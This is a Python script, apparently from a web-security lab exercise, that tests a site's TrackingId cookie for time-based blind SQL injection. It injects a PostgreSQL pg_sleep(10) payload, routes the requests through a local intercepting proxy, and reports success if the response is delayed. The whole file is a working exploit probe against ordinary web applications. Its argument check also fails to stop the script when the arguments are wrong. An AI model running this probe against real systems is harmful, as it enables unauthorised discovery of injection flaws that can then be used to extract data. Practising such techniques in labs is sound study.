import sys
import urllib.parse
import requests
import urllib3
import urllib

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def blind_sqli_check(url,session_cookie):

    sql_payload = "' || (SELECT pg_sleep(10)) -- "
    sqli_payload_encoded = urllib.parse.quote(sql_payload)
    cookies = {
        'TrackingId':""+sqli_payload_encoded, # i don't think we need the value of the tracking cookie since it injectable 
        'session':session_cookie,
    }

    response = requests.get(url,verify=False,cookies=cookies,proxies=proxies)

    if response.elapsed.total_seconds() >=10:
        print( "(+) Exploitation Done Successfully ")
        print( "(+) The trackingId Cookie is actually vulnerable to time based SQLi ")
    else:
        print("(-) Not vulnerable to blind SQL Injection")


def main():
    if len(sys.argv) != 3 :
        print("(-) Usage: %s <url>  <session_cookie>" %sys.argv[0])
        print("(-) Example: %s https://www.example.com  \"ay_value\" " %sys.argv[0])
    
    url = sys.argv[1]
    session_cookie = sys.argv[2]
    print("(+) Checking if tracking cookie is vulnerable to time-based blind SQLi...")
    blind_sqli_check(url,session_cookie)




if __name__ == "__main__":
    main()